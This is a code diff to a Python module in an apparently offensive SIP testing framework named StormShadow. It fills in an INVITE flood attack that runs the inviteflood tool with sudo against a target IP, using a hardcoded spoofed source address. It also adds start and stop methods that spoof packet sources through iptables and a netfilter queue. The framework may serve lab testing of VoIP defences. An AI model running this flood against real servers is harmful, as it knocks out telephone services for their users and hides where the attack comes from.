@@ -8,10 +8,12 @@ This module integrates with the StormShadow orchestrator architecture.
 from pathlib import Path
 from typing import List, Optional
 from utils.attack.attack_enums import AttackProtocol, AttackType
-from utils.core.printing import print_info
+from utils.core.printing import print_error, print_info
 from utils.interfaces.attack_interface import AttackInterface
 from utils.registry.metadata import ModuleInfo
+from utils.core.command_runner import run_command
 
+from sip_attacks.sip_spoofing import SipPacketSpoofer 
 
 class InviteFloodAttack(AttackInterface):
     """
@@ -64,6 +66,16 @@ class InviteFloodAttack(AttackInterface):
         self.name = "InviteFloodAttack"
         self.dry_run_implemented = True  # Indicate that dry-run is implemented for this attack
         self.resume_implemented = True  # Indicate that resume is implemented for this
+        self.spoofing_implemented = True  # Indicate that spoofing is implemented for this attack
+
+        self.spoofer : Optional[SipPacketSpoofer] = SipPacketSpoofer(
+            attack_queue_num=attack_queue_num,
+            spoofed_subnet=spoofing_subnet,
+            victim_port=target_port,
+            victim_ip=target_ip,
+            attacker_port=source_port
+        ) if spoofing_subnet else None
+
         self.debug_parameters()
         # Print the initialization message
 
@@ -80,7 +92,24 @@ class InviteFloodAttack(AttackInterface):
 
     def run(self) -> None:
         print_info("Running InviteFlood attack")
-        # Implement the attack logic here
+        # Build the inviteflood command with required and optional arguments
+        try:
+            command = (
+                f"inviteflood "
+                f"{self.interface} "
+                f'200 '  # target user (empty string for all)
+                f"{self.target_ip} "  # target domain (using IP)
+                f"{self.target_ip} "  # IPv4 addr of flood target
+                f"{self.max_count} "  # flood stage (number of packets)
+                f"-i 10.10.123.1 "  # source IP address
+                f"-S {self.source_port} "  # source port
+                # f"-D {self.target_port} "  # destination port
+            )
+            run_command(command,sudo=True, capture_output=False, check=True)
+        except Exception as e:
+            print_error(f"Failed to run InviteFlood attack: {e}")
+            self.cleanup()
+            return
 
     def stop(self) -> None:
         print_info("Stopping InviteFlood attack")
@@ -91,6 +120,45 @@ class InviteFloodAttack(AttackInterface):
         return "This is a InviteFlood attack module for demonstration purposes." \
         "It can be extended to implement specific attack logic." \
         "It inherits from AttackInterface and implements the required methods."
-    
-    
 
+    def start_spoofing(self) -> bool:
+        """
+        Implement spoofing logic for the InviteFlood attack.
+        
+        This method should set up the necessary iptables rules and netfilter queue
+        to handle packet spoofing if required by the attack.
+        
+        Returns:
+            bool: True if spoofing is successfully set up, False otherwise.
+        """
+        print_info("Setting up spoofing for InviteFlood attack")
+        if self.spoofer:
+            if not self.spoofer.start_spoofing():
+                print_error("Failed to start spoofing for InviteFlood attack")
+                return False
+            print_info("Spoofing started successfully for InviteFlood attack")
+            return True
+        else:
+            print_error("No spoofing configured for InviteFlood attack")
+            return False
+
+    def stop_spoofing(self) -> bool:
+        """
+        Stop spoofing for the InviteFlood attack.
+        
+        This method should remove the iptables rules and netfilter queue
+        used for packet spoofing if it was set up.
+        
+        Returns:
+            bool: True if spoofing is successfully stopped, False otherwise.
+        """
+        print_info("Stopping spoofing for InviteFlood attack")
+        if self.spoofer:
+            if not self.spoofer.stop_spoofing():
+                print_error("Failed to stop spoofing for InviteFlood attack")
+                return False
+            print_info("Spoofing stopped successfully for InviteFlood attack")
+            return True
+        else:
+            print_error("No spoofing configured to stop for InviteFlood attack")
+            return False
